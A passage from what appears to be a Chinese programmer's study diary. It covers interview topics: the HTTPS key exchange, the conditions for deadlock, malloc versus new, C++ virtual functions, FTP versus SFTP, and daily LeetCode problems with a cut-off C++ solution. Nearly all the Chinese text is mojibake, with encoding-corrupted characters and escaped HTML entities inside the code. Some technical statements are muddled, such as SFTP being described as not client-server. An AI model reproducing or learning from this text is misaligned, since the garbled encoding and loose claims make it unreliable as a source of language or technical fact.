å¯†é€šä¿¡ã€‚ å®é™…ä¸Šï¼Œè¿™ä¸¤ç§æè¿°æ‰€ä¸åŒçš„åœ°æ–¹ä»…åœ¨äºä¸€ä¸ªå…³é”®çš„æ­¥éª¤ï¼šå¯†é’¥äº¤æ¢ã€‚\nåœ¨ç¬¬ä¸€ç§æè¿°ä¸­ï¼Œè¡¨ç°çš„æ˜¯åä¸º DHE(Diffie-Hellman Exchange) çš„å¯†é’¥äº¤æ¢æ–¹å¼ï¼Œè€Œç¬¬äºŒç§æè¿°ä¸­ï¼Œè¡¨ç°çš„æ˜¯åä¸º RSAå¯†é’¥äº¤æ¢ çš„æ–¹å¼ã€‚ç¬¬äºŒç§æè¿°çš„å®ç°æ–¹æ³•æ³•éå¸¸ç®€å•ï¼Œä½†å‡å¦‚æœåŠ¡ç«¯çš„ç§é’¥è¢«ç ´è§£ï¼Œå°†å¯ä»¥è§£å¯†æ­¤å‰æˆªå–çš„æ‰€æœ‰æµé‡ï¼Œå³è¿™ç§åŠæ³•ä¸å…·å¤‡ å‰å‘å®‰å…¨ æ€§ã€‚\nReference\n[1] è®©é¢è¯•å®˜è†œæ‹œä½ çš„HTTPSè¿è¡Œæµç¨‹ï¼ˆè¶…è¯¦ç»†ï¼‰ - çŸ¥ä¹ (zhihu.com)\n[2] HTTPSåŸç†å’Œé€šä¿¡æµç¨‹ - çŸ¥ä¹ (zhihu.com)\n[3] çŸ³ç‘ç”Ÿ.å¤§æ•°æ®å®‰å…¨CH02-03-å®‰å…¨åŸºç¡€çŸ¥è¯†.2020å¹´ç§‹å­£å­¦æœŸ.BUPT\n[4] ã€ŠHTTPSæƒå¨æŒ‡å—ã€‹ç¬”è®°-å¯†é’¥äº¤æ¢ - ç®€ä¹¦ (jianshu.com)\næ˜¨å¤©å·¥ä½œç´¯çˆ†ï¼Œæ²¡æœ‰å­¦ä¹ ï¼Œä»Šå¤©ä¼‘æ¯ï¼Œè¡¥ä¸Š~\n3 æ­»é” æ˜¨å¤©é‡åˆ°çš„é¢è¯•é¢˜ï¼Œç­”å¾—è¿˜ç®—å¯ä»¥ï¼Œä½†æ˜¯æœ‰ä¸€äº›ç‚¹è¿˜æ˜¯å¿˜äº†ã€‚æ­»é”ä¹Ÿæ˜¯ç½‘ä¸Šå„ä¸ªé¢ç»çš„å¸¸å®¢äº†ï¼Œç¨ä½œæ¢³ç†ï¼Œä¸äºã€‚\n3.1 å®šä¹‰ æ“ä½œç³»ç»Ÿä¸­å¾€å¾€æœ‰å¤šä¸ªè¿›ç¨‹åœ¨å¹¶å‘æ‰§è¡Œï¼Œè€Œæ‰€è°“æ­»é”ï¼Œæ˜¯æŒ‡å¤šä¸ªè¿›ç¨‹å› ç«äº‰èµ„æºè€Œé€ æˆçš„ä¸€ç§åƒµå±€ï¼ˆäº’ç›¸ç­‰å¾…ï¼‰ï¼Œè‹¥æ— å¤–åŠ›ä½œç”¨ï¼Œè¿™äº›è¿›ç¨‹éƒ½å°†æ— æ³•å‘å‰æ¨è¿›ã€‚\n3.2 æ­»é”äº§ç”Ÿçš„åŸå› å’Œå¿…è¦æ¡ä»¶ ï¼ˆ1ï¼‰ç³»ç»Ÿèµ„æºçš„ç«äº‰\né€šå¸¸ç³»ç»Ÿä¸­æ‹¥æœ‰çš„ä¸å¯å‰¥å¤ºèµ„æºï¼Œæ•°é‡ä¸è¶³ä»¥æ»¡è¶³å¤šä¸ªè¿›ç¨‹è¿è¡Œçš„éœ€è¦ã€‚è‹¥è¿›ç¨‹åœ¨è¿è¡Œä¸­å› ä¸ºå¯¹ä¸å¯å‰¥å¤ºèµ„æºçš„ç«äº‰è€Œé™·å…¥åƒµå±€ï¼Œå°±å¯èƒ½äº§ç”Ÿæ­»é”ã€‚å¯¹å¯å‰¥å¤ºèµ„æºçš„ç«äº‰æ˜¯ä¸ä¼šå¼•èµ·æ­»é”çš„ã€‚\nï¼ˆ2ï¼‰è¿›ç¨‹çš„æ¨è¿›é¡ºåºéæ³•\nè¿›ç¨‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œè¯·æ±‚å’Œé‡Šæ”¾èµ„æºçš„é¡ºåºä¸å½“ï¼Œä¹ŸåŒæ ·ä¼šå¯¼è‡´æ­»é”ã€‚\nä¿¡å·é‡ä½¿ç”¨ä¸å½“ä¹Ÿä¼šé€ æˆæ­»é”ã€‚\nï¼ˆ3ï¼‰æ­»é”äº§ç”Ÿçš„å¿…è¦æ¡ä»¶\næ˜¨å¤©é¢è¯•çš„æ—¶å€™çŸ­è·¯é—å¿˜çš„çŸ¥è¯†ç‚¹ï¼ˆå°å£°ï¼‰ã€‚\näº§ç”Ÿæ­»é”å¿…é¡»åŒæ—¶æ»¡è¶³4ä¸ªæ¡ä»¶ï¼Œåªè¦å…¶ä¸­ä¸€ä¸ªä¸æˆç«‹ï¼Œæ­»é”å°±ä¸ä¼šäº§ç”Ÿã€‚\näº’æ–¥æ¡ä»¶ã€‚å¦‚æœæŸä¸ªèµ„æºæ— éœ€äº’æ–¥è®¿é—®ï¼Œè‡ªç„¶å°±ä¸å­˜åœ¨å¯¹å®ƒçš„ç«äº‰äº†ã€‚\nä¸å‰¥å¤ºæ¡ä»¶ã€‚\nè¯·æ±‚å’Œä¿æŒæ¡ä»¶ã€‚è¿›ç¨‹å·²ç»ä¿æŒäº†è‡³å°‘ä¸€ä¸ªèµ„æºï¼Œè€Œåœ¨æå‡ºæ–°çš„èµ„æºè¯·æ±‚çš„æ—¶å€™ï¼Œè¯¥èµ„æºå·²è¢«å…¶ä»–è¿›ç¨‹å ç”¨ï¼Œæ­¤æ—¶å½“å‰è¿›ç¨‹è¢«é˜»å¡ï¼›ä½†æ˜¯å®ƒå¯¹è‡ªå·±å·²ç»è·å¾—çš„èµ„æºä¿æŒä¸æ”¾ã€‚\næˆ‘ç†è§£è¿™ä¸€æ¡ä»¶å’Œä¸å‰¥å¤ºæ¡ä»¶çš„åŒºåˆ«æ˜¯ï¼Œè¯·æ±‚å’Œä¿æŒæ¡ä»¶å…è®¸è¿›ç¨‹å¯ä»¥ä¿æŒèµ„æºä¸æ”¾ï¼Œä½†æ˜¯å…¶ä»–è¿›ç¨‹å¯èƒ½å¼ºè¡Œå‰¥å¤ºï¼›å¦‚æœä½ ä¿æŒä¸æ”¾ï¼Œä¸”å¤–äººä¸èƒ½å‰¥å¤ºçš„è¯ï¼Œå°±å¯èƒ½é™·å…¥åƒµå±€ã€‚\nå¾ªç¯ç­‰å¾…æ¡ä»¶ã€‚å­˜åœ¨ä¸€ç§è¿›ç¨‹èµ„æºçš„å¾ªç¯ç­‰å¾…é“¾ï¼Œé“¾ä¸­æ¯ä¸ªè¿›ç¨‹å·²è·å¾—çš„èµ„æºåŒæ—¶è¢«é“¾ä¸­ä¸‹ä¸€ä¸ªè¿›ç¨‹æ‰€è¯·æ±‚ã€‚ç›´è§‚ä¸Šçœ‹ï¼Œå¾ªç¯ç­‰å¾…æ¡ä»¶ä¼¼ä¹å’Œæ­»é”çš„å®šä¹‰ä¸€æ ·ï¼Œå…¶å®ä¸ç„¶ã€‚æŒ‰æ­»é”å®šä¹‰æ‰€æ„æˆçš„ç­‰å¾…ç¯è¦æ±‚çš„æ¡ä»¶æ›´ä¸¥æ ¼ï¼Œå®ƒè¦æ±‚ Pi ç­‰å¾…çš„èµ„æºå¿…é¡»ç”± Pi+1 æ¥æ»¡è¶³ï¼Œå¾ªç¯ç­‰å¾…æ¡ä»¶åˆ™æ— æ­¤é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œç³»ç»Ÿä¸­æœ‰ä¸¤å°è®¾å¤‡ï¼Œ P0 å æœ‰ä¸€å°ï¼Œ Pk å æœ‰ä¸€å°ï¼Œ Pn è¯·æ±‚è¿™ä¸€è®¾å¤‡ï¼Œåˆ™è¿™ä¸€è®¾å¤‡å¯ä»¥ä» P0 å¤„è·å¾—ï¼Œä¹Ÿå¯ä»¥ä» Pk å¤„è·å¾—ï¼›è™½ç„¶ P0 åˆ° Pn æ„æˆäº†ä¸€ä¸ªç­‰å¾…åœˆï¼Œä½†ç­‰å¾…åœˆå¤–çš„è®¾å¤‡ Pk åªè¦é‡Šæ”¾äº†è¿™ä¸€è®¾å¤‡ï¼Œå°±æ‰“ç ´äº†ç­‰å¾…ã€‚å› æ­¤ï¼Œå¾ªç¯ç­‰å¾…æ¡ä»¶åªæ˜¯æ­»é”çš„å¿…è¦æ¡ä»¶ã€‚\n3.3 æ­»é”çš„å¤„ç†ç­–ç•¥ ï¼ˆ1ï¼‰æ­»é”é¢„é˜²\næ‰“ç ´å››ä¸ªå¿…è¦æ¡ä»¶ä¸­çš„æŸä¸€ä¸ªï¼Œå³å¯å®Œå…¨é˜²æ­¢æ­»é”çš„å‡ºç°ã€‚\nï¼ˆ2ï¼‰æ­»é”é¿å…\næ³¨æ„â€œé¿å…â€å’Œâ€œé¢„é˜²â€çš„åŒºåˆ«ã€‚\nåœ¨èµ„æºçš„åŠ¨æ€åˆ†é…è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨æŸç§æ–¹æ³•ï¼ˆå¦‚é“¶è¡Œå®¶ç®—æ³•ï¼‰æ¥é˜²æ­¢ç³»ç»Ÿè¿›å…¥ä¸å®‰å…¨çŠ¶æ€ï¼Œä»è€Œé¿å…æ­»é”ã€‚\nï¼ˆ3ï¼‰æ­»é”çš„æ£€æµ‹å’Œè§£é™¤\näº‹å…ˆä¸é‡‡å–ä»»ä½•é™åˆ¶æ€§æªæ–½ï¼Œå…è®¸è¿›ç¨‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿæ­»é”ã€‚é€šè¿‡ç³»ç»Ÿçš„æ£€æµ‹æœºæ„åŠæ—¶åœ°æ£€æµ‹å‡ºæ­»é”çš„å‘ç”Ÿï¼Œç„¶åé‡‡å–æŸäº›æªæ–½è§£é™¤æ­»é”ï¼ˆå‰¥å¤ºèµ„æºã€æ€æ­»è¿›ç¨‹ã€è¿›ç¨‹å›é€€ï¼‰ã€‚\nå‘¨æœ«æ˜¯å¦‚æ­¤çš„Relaxedï¼Œä»Šå¤©åˆåªè®°å½•äº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œç¡è§‰å»ä¹Ÿ~\nReference\n[1] ç‹é“è®ºå›.2021å¹´æ“ä½œç³»ç»Ÿè€ƒç ”å¤ä¹ æŒ‡å¯¼[M].åŒ—äº¬:ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾,2020:129::131\nåŸºæœ¬ä¸Šä¸€æ•´å¤©éƒ½åœ¨å¼„åšå®¢æ ·å¼ï¼ŒæŠ˜è…¾æ¥æŠ˜è…¾å»ï¼Œæ²¡æœ‰å¤ªå¤§çš„æ”¹è§‚Â·Â·Â·Â·Â·Â·\n4 mallocå’Œnewçš„åŒºåˆ« C++ç»å…¸é—®é¢˜ä¹‹ä¸€ã€‚\nï¼ˆ1ï¼‰æ˜¯å¦è°ƒç”¨æ„é€ å‡½æ•°ã€‚ malloc ä¸ºä¸€ä¸ªå¯¹è±¡ç”³è¯·ç©ºé—´æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒçš„æ„é€ å‡½æ•°ï¼›è€Œ new ä¼šè‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•°ã€‚åŒæ—¶ï¼Œä½¿ç”¨ new ç”³è¯·ä¸€ä¸ªå¯¹è±¡æ•°ç»„æ—¶ï¼Œä¼šå¯¹æ¯ä¸€ä¸ªå•å…ƒè¿›è¡Œæ„é€ å‡½æ•°çš„è°ƒç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\nA* ptr = new A[10];\t// å¯¹æ¯ä¸€ä¸ªå¯¹è±¡è°ƒç”¨æ„é€ å‡½æ•° delete[] ptr;\t// newæ•°ç»„çš„æ—¶å€™è¦æ­é… delete[] ï¼ˆ2ï¼‰ä¸€ä¸ªæ˜¯å‡½æ•°ï¼Œä¸€ä¸ªæ˜¯è¿ç®—ç¬¦ï¼ˆoperator newï¼‰ã€‚ malloc è™½ç„¶æ˜¯å‡½æ•°ï¼Œä½†æ˜¯å®ƒä¸å…è®¸é‡è½½ï¼›è€Œ new å¯ä»¥è¢«é‡è½½ã€‚\nï¼ˆ3ï¼‰è¿”å›ç±»å‹ä¸åŒã€‚ malloc è¿”å›ä¸€ä¸ª void* ç±»å‹çš„æŒ‡é’ˆï¼ŒæŒ‡å‘ç”³è¯·çš„é‚£å—ç©ºé—´ï¼›è€Œ new è¿”å›çš„æ˜¯ä¸€ä¸ª ç¡®åˆ‡çš„ å¯¹è±¡æŒ‡é’ˆã€‚\nï¼ˆ4ï¼‰é”™è¯¯å¤„ç†ã€‚ malloc ç”³è¯·å†…å­˜å¤±è´¥ä¹‹åï¼Œä¼šè¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆ NULL ï¼›è€Œ new ç”³è¯·å†…å­˜å¤±è´¥åï¼Œä¼šæŠ›å‡º bad_alloc å¼‚å¸¸ã€‚\nï¼ˆ5ï¼‰å†…å­˜åŒºåŸŸã€‚ malloc ä»å †ä¸­ç”³è¯·å†…å­˜ï¼›è€Œ new ä¼šä» è‡ªç”±å­˜å‚¨åŒºï¼ˆfree storeï¼‰ ä¸Šç”³è¯·å†…å­˜ã€‚è‡ªç”±å­˜å‚¨åŒºæ˜¯C++åŸºäºnewæ“ä½œç¬¦çš„ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œå‡¡æ˜¯é€šè¿‡newæ“ä½œç¬¦è¿›è¡Œå†…å­˜ç”³è¯·ï¼Œè¯¥å†…å­˜å³ä¸ºè‡ªç”±å­˜å‚¨åŒºã€‚è‡ªç”±å­˜å‚¨åŒºçš„å…·ä½“æ€§è´¨ï¼Œå–å†³äº new è¿ç®—ç¬¦çš„å®ç°æ–¹å¼ï¼Œå®ƒæœ¬èº«ä¹Ÿå¯ä»¥æ˜¯å †ã€‚\nï¼ˆ6ï¼‰ç”³è¯·çš„å¤§å°ã€‚ malloc éœ€è¦è°ƒç”¨è€…ä¼ å…¥è¦ç”³è¯·çš„å†…å­˜å¤§å°ï¼›è€Œ new ç”³è¯·çš„ç©ºé—´å¤§å°ç”±ç¼–è¯‘å™¨è‡ªåŠ¨è®¡ç®—ã€‚\nï¼ˆ7ï¼‰æ›´æ”¹å¤§å°ã€‚ malloc å…è®¸é€šè¿‡ realloc() å‡½æ•°æ›´æ”¹ç¼“å†²åŒºå¤§å°ï¼Œå‡å¦‚è¦å°†ç¼“å†²åŒºå˜å¤§ï¼Œç³»ç»Ÿä¼šåˆ†é…ä¸€å—æ›´å¤§çš„ç©ºé—´ï¼Œç„¶åå°†å½“å‰ç¼“å†²åŒºä¸­çš„å†…å®¹å¤åˆ¶è¿‡å»ï¼›è€Œ new ä¸å…è®¸æ›´æ”¹ç”³è¯·åˆ°çš„ç¼“å†²åŒºçš„å¤§å°ã€‚\nReference\n[1] malloc() vs new - GeeksforGeeks\n[2] c++ new ä¸mallocæœ‰ä»€ä¹ˆåŒºåˆ« - ywliao - åšå®¢å›­ (cnblogs.com)\n5 è™šå‡½æ•° è™šå‡½æ•°ä¸€èˆ¬åœ¨ç»§æ‰¿çš„åœºæ™¯ä¸‹å‘æŒ¥ä½œç”¨ã€‚åŸºç±»å£°æ˜ä¸€ä¸ªè™šå‡½æ•°ï¼Œå­ç±»é‡è½½è¿™ä¸€å‡½æ•°ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªåŸºç±»æŒ‡é’ˆæŒ‡å‘å­ç±»ï¼Œå¹¶ä¸”å¸Œæœ›è°ƒç”¨è¿™ä¸€å‡½æ•°çš„æ—¶å€™ï¼Œå¾—åˆ°çš„å°±æ˜¯å­ç±»é‡è½½è¿‡çš„å‡½æ•°ã€‚\nå®é™…ä¸Šï¼Œè™šå‡½æ•°çš„æ„ä¹‰å°±åœ¨äºèƒ½å¤Ÿä½¿å¾—å‡½æ•°è°ƒç”¨åˆä¹é€»è¾‘ï¼Œè€Œä¸å¿…è€ƒè™‘æŒ‡é’ˆçš„ç±»å‹ã€‚\nè™šå‡½æ•°çš„è§£æåœ¨è¿è¡Œçš„æ—¶å€™å®Œæˆã€‚\nä»¥ä¸‹æœ‰å‡ ä¸ªè™šå‡½æ•°çš„ä½¿ç”¨åŸåˆ™ï¼š\nä¸èƒ½æ˜¯ static å‡½æ•°ï¼› å¯ä»¥æ˜¯å…¶ä»–ç±»çš„å‹å…ƒå‡½æ•°ï¼› ä½¿ç”¨åŸºç±»æŒ‡é’ˆæˆ–è€…å¼•ç”¨æ¥è°ƒç”¨è™šå‡½æ•°ï¼Œä»¥è·å¾— è¿è¡Œæ—¶å¤šæ€ï¼ˆrun time polymorphismï¼‰ ï¼› ä¸€èˆ¬åœ¨åŸºç±»å®šä¹‰ã€å­ç±»é‡è½½ï¼Œä½†æ²¡æœ‰å¼ºåˆ¶è¦æ±‚å­ç±»è¿›è¡Œé‡è½½ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å’Œæ™®é€šçš„å‡½æ•°ç»§æ‰¿æ²¡æœ‰åŒºåˆ«ï¼› å¯ä»¥æœ‰ è™šææ„å‡½æ•°ï¼ˆvirtual destructorï¼‰ ï¼Œä½†ä¸èƒ½æœ‰ è™šæ„é€ å‡½æ•°ï¼ˆvirtual constructorï¼‰ ã€‚ å¤œå·²æ·±äº†ï¼Œä¸”å…ˆä¼‘æ¯å»ï¼Œæ¥æ—¥å†ä½œè¡¥å……~\nReference\n[1] Virtual Function in C++ - GeeksforGeeks\n2021-07-26 ä»Šå¤©åšé¢˜ï¼Œå­¦ä¹ äº† ã€æœ€é•¿é€’å¢å­åºåˆ—ã€‘ çš„è§£æ³•ã€ä¹‹åACäº†ä¸€é“å›°éš¾é¢˜ï¼å‡†å¤‡æ–°å¼€ä¸€ç¯‡éš¾é¢˜æœ¬è®²è®²è¿™é“é¢˜ï¼š 1713. å¾—åˆ°å­åºåˆ—çš„æœ€å°‘æ“ä½œæ¬¡æ•° - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\næ‰€ä»¥å°±é¸½äº†é¸½äº†~\n2021-07-27 ä»Šå¤©æŠ•ç®€å†ï¼Œæ”¹å®Œä¹‹åå¤œæ·±äº†ï¼›æ˜å¤©ç•™å…¬å¸ï¼Œä¼°è®¡ä¹Ÿæ²¡æœ‰æ–°çš„çŸ¥è¯†ç‚¹å­¦ä¹ ã€‚å¸Œæœ›æ˜¨å¤©è¯´çš„æ–‡ç« èƒ½å°½å¿«å®Œæˆå§ã€‚\næ—¢ç„¶å•¥çŸ¥è¯†ç‚¹éƒ½æ²¡å­¦ï¼Œå°±ç®€å•è®²ä¸€ä¸‹æ¯æ—¥ä¸€é¢˜å§ã€‚ä»Šå¤©çš„æ¯æ—¥ä¸€é¢˜æ˜¯ 671. äºŒå‰æ ‘ä¸­ç¬¬äºŒå°çš„èŠ‚ç‚¹ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\nå¦‚ä½•æ‰¾åˆ°ã€ç¬¬äºŒå°ã€‘çš„èŠ‚ç‚¹ï¼Œä¸‹åˆæŠ˜è…¾äº†ä¸€æ®µæ—¶é—´ï¼›æ™šä¸Šå›æ¥ï¼Œç¨ä½œè€ƒè™‘ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æ’åº+éå†çš„æ–¹æ³•ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªä¸å·¦é‚»å±…ä¸åŒçš„å…ƒç´ å³å¯ã€‚\nä¸¤æ¬¡éå†çš„æƒ…å†µæœ‰ä¸€ç‚¹é—®é¢˜ï¼Œæµ‹è¯•ç”¨ä¾‹æœ‰ä¸€ç»„ [2,2,2147483647] ï¼Œç”¨ INT_MAX åˆå§‹åŒ–ç­”æ¡ˆï¼Œæ‰¾æœ€å°å€¼çš„åŠæ³•æ˜¯è¡Œä¸é€šçš„ï¼Œå‡ºé¢˜äººå±å®å¾ˆæœ‰æ°´å¹³ã€‚\nç­”æ¡ˆé‡Œè¿˜æœ‰äººç›´æ¥ä½¿ç”¨ set ï¼Œå±äºæ˜¯æŠŠSTLç©æ˜ç™½äº†ï¼Œæˆ‘ä»¥åä¹Ÿè¦å¥½å¥½å†å­¦ä¸€ä¸‹STL o(â•¥ï¹â•¥)o\n2021-07-28 ä»Šå¤©å…¬å¸ç•™å®¿ï¼Œä¸æ›´æ–°æ˜¯ç†æ‰€å½“ç„¶çš„å§~ ä»Šæ—¥çš„æ¯æ—¥ä¸€é¢˜æ˜¯ https://leetcode-cn.com/problems/all-nodes-distance-k-in-binary-tree/ ï¼Œä¸­ç­‰é¢˜ï¼Œä¸€æ—¶é—´æ²¡æœ‰æ€è·¯ï¼›çœ‹äº†é¢˜è§£ä¹‹åå‘ç°äºŒå‰æ ‘å¯ä»¥è½¬ä¸ºå›¾ï¼Œè¿™æ ·å°±æ¯”è¾ƒç®€å•äº†ã€‚ ä¸€å¼€å§‹æƒ³ç”¨é‚»æ¥çŸ©é˜µï¼Œä½†æ˜¯ä¸€ä¸ªèŠ‚ç‚¹å®é™…ä¸Šåªå¯èƒ½æœ‰ä¸‰æ¡è¾¹ï¼Œé‚£å°±ä½¿ç”¨dfså…ˆå­˜ä¸‹è¿™ä¸ªèŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ï¼Œè¿™æ ·ä¸€ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰é‚»å±…å°±å…¨éƒ½å¯ä»¥æ‰¾åˆ°äº†ï¼ˆä¸¤ä¸ªå­èŠ‚ç‚¹åŠ ä¸Šä¸€ä¸ªçˆ¶èŠ‚ç‚¹ï¼Œæœ€å¤šåªæœ‰ä¸‰ä¸ªé‚»å±…ï¼‰ï¼›æ„é€ å®Œäº†ä¸€ä¸ªæŠ½è±¡æ„ä¹‰ä¸Šçš„â€œå›¾â€ï¼Œä½¿ç”¨BFSæ‰¾ç›®æ ‡è·ç¦»çš„èŠ‚ç‚¹å³å¯ã€‚\n2021-07-29 è°Œé¾™ç¿»ç›˜ææ¢“å˜‰ï¼å§œè¿˜æ˜¯è€çš„è¾£ï¼\nä»Šå¤©çš„çŸ¥è¯†ç‚¹å¯å‘äºç™½å¤©çš„å·¥ä½œä¸­ï¼Œå®é™…ä¸Šå¹¶ä¸æ˜¯éå¸¸çš„é‡è¦ï¼Œä»…ç¨ä½œè®°å½•ã€‚\n6 FTPä¸SFTP FTP æ˜¯æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆFile Transport Protocolï¼‰çš„ç®€å†™ï¼Œä½¿ç”¨ C/S æ¶æ„åœ¨webæœåŠ¡å™¨å’ŒFTPå®¢æˆ·ç«¯ä¹‹é—´è¿›è¡Œæ–‡ä»¶ä¼ è¾“ã€‚FTPä½¿ç”¨ä¸¤ä¸ªç‹¬ç«‹çš„è¿æ¥ï¼Œåˆ†åˆ«æ˜¯å‘½ä»¤è¿æ¥å’Œæ•°æ®è¿æ¥ï¼Œå‰è€…ç”¨äºä¼ è¾“æŒ‡ä»¤ï¼Œåè€…ç”¨äºä¼ è¾“æ•°æ®ï¼ˆæ–‡ä»¶ï¼‰ã€‚å®é™…ä¸Šï¼ŒåŒè¿æ¥çš„æœºåˆ¶åœ¨ä½¿ç”¨socketç¼–ç¨‹æ¥å®ç°æ–‡ä»¶ä¼ è¾“åŠŸèƒ½æ—¶ï¼Œæ˜¯éå¸¸æœ‰æ„ä¹‰çš„ï¼šå½“æœåŠ¡å™¨å‘é€å®Œæ–‡ä»¶ä¹‹åï¼Œå¯ä»¥ç›´æ¥å…³é—­æ–‡ä»¶è¿æ¥çš„socketï¼Œè¿™æ ·å‘½ä»¤è¿æ¥å°±çŸ¥é“æ–‡ä»¶ä¼ è¾“å·²ç»å®Œæˆï¼Œå¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥å·¥ä½œäº†ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼ŒFTPæ²¡æœ‰åŠ å¯†ï¼Œä¹Ÿå°±æ„å‘³ç€ ä¸­é—´äººæ”»å‡» çš„å¯èƒ½æ€§ã€‚\nSFTP æ˜¯SSH File Transport Protocolçš„ç®€å†™ï¼Œæˆ–è€…ä¹Ÿè¢«æˆä¸ºSecure File Transport Protocolã€‚å®ƒæä¾›ä¸FTPä¸€æ ·çš„åŠŸèƒ½ï¼Œä½†åŸºäºSSHè€ŒéC/Sæ¶æ„çš„FTPå®ç°ã€‚SFTPåªä½¿ç”¨ä¸€ä¸ªè¿æ¥ï¼Œå¹¶è¦æ±‚ç”¨æˆ·ä½¿ç”¨ç”¨æˆ·å/å¯†ç æˆ–è€…SSHå¯†é’¥çš„æ–¹å¼è¿›è¡Œæˆæƒã€‚\nç”±äºå®ç°æ–¹å¼çš„ä¸åŒï¼ŒFTPä½¿ç”¨çš„ç«¯å£æ˜¯ä¼ ç»Ÿçš„21ï¼Œè€ŒSFTPä½¿ç”¨ä¸SSHç›¸åŒçš„22ç«¯å£ã€‚\n[1] FTP vs SFTP: What\u0026rsquo;s the Difference? Which One Should You Use? (kinsta.com)\n7 LeetCode 987. äºŒå‰æ ‘çš„å‚åºéå† å› ä¸å¯æŠ—åŠ›æ–­æ›´ï¼Œæ˜¨å¤©é‡æ„Ÿå†’äº†Â·Â·Â·Â·Â·Â·\nä»Šå¤©ä»ç„¶æ²¡å¥½ï¼Œä»…å¯¹æ¯æ—¥ä¸€é¢˜è¿›è¡Œè®°å½•ã€‚\nä»Šå¤©çš„æ¯æ—¥ä¸€é¢˜æ˜¯ 987. äºŒå‰æ ‘çš„å‚åºéå† - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\né¢˜ç›®ç»™çš„æ•°æ®å±äºæ˜¯å°‘äº†ï¼Œé’ˆå¯¹ä¸€åƒä¸ªäºŒå‰æ ‘èŠ‚ç‚¹ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ª multimap æ¥è¿›è¡Œ åˆ— â†’ Node çš„æ˜ å°„ï¼Œæ³¨æ„è¿™é‡Œçš„ Node æŒ‡çš„æ˜¯è‡ªå®šä¹‰çš„æ•°æ®ç»“æ„ï¼š\ntypedef struct _node { int val; int row; } Node, *PNode; æˆ‘ä»¬ä½¿ç”¨ multimap æ¥å°†æŸä¸ªåˆ—ä¸Šçš„æ‰€æœ‰èŠ‚ç‚¹å­˜å‚¨èµ·æ¥ï¼Œä½¿ç”¨ Node æ¥è®°å½•èŠ‚ç‚¹æ‰€åœ¨çš„è¡Œå’Œå€¼ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬éå†å®Œæˆä¹‹åå¾—åˆ°çš„ multimap å°±èƒ½å¤Ÿæ ¹æ®ä¸€ä¸ªåˆ—å€¼å–å‡ºè¿™ä¸€åˆ—ä¸Šçš„æ‰€æœ‰èŠ‚ç‚¹ï¼›æˆ‘ä»¬åˆ©ç”¨è¿™äº› Node çš„è¡Œå’Œå€¼è¿›è¡Œæ’åºï¼Œæ­£å¦‚é¢˜æ„æ‰€è¯´çš„ï¼š\näºŒå‰æ ‘çš„ å‚åºéå† ä»æœ€å·¦è¾¹çš„åˆ—å¼€å§‹ç›´åˆ°æœ€å³è¾¹çš„åˆ—ç»“æŸï¼ŒæŒ‰åˆ—ç´¢å¼•æ¯ä¸€åˆ—ä¸Šçš„æ‰€æœ‰ç»“ç‚¹ï¼Œå½¢æˆä¸€ä¸ªæŒ‰å‡ºç°ä½ç½®ä»ä¸Šåˆ°ä¸‹æ’åºçš„æœ‰åºåˆ—è¡¨ã€‚å¦‚æœåŒè¡ŒåŒåˆ—ä¸Šæœ‰å¤šä¸ªç»“ç‚¹ï¼Œåˆ™æŒ‰ç»“ç‚¹çš„å€¼ä»å°åˆ°å¤§è¿›è¡Œæ’åºã€‚\nè¿™é‡Œæ³¨æ„ multimap çš„å‡ ä¸ªç”¨æ³•ï¼š\nmultimap.emplace(key, value); // æ’å…¥å€¼ multimap.equal_range(key); // è¿”å›keyå€¼å¯¹åº”çš„æ‰€æœ‰valueï¼Œè¿”å›å€¼æ˜¯ä¸€ä¸ªpairï¼Œé¦–å…ƒç´ æ˜¯åŒºé—´èµ·ç‚¹ï¼Œæ¬¡å…ƒç´ æ˜¯åŒºé—´ç»ˆç‚¹çš„åé¢ ç‹¬ç«‹è‡ªä¸»å®Œæˆçš„å›°éš¾é¢˜ï¼ŒACä»£ç è¿˜æ˜¯è¦è´´ä¸€ä¸‹~\n/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */ class Solution { public: typedef struct _node { int val; int row; } Node, *PNode; multimap\u0026lt;int, Node\u0026gt; col2node; void dfs(TreeNode* root, int row, int col) { Node n; n.val = root-\u0026gt;val; n.row = row; col2node.emplace(col, n); if (root-\u0026gt;left) dfs(root-\u0026gt;left, row + 1, col - 1); if (root-\u0026gt;right) dfs(root-\u0026gt;right, row + 1, col + 1); } static bool cmp(Node\u0026amp; a, Node\u0026amp; b) { if (a.row \u0026lt; b.row) return true; else if (a.row == b.row) return a.val \u0026lt; b.val; else return false; } vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; verticalTraversal(TreeNode* root) { dfs(root, 0, 0); vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; for (int c = -1000; c \u0026lt;= 1000; c++) { if 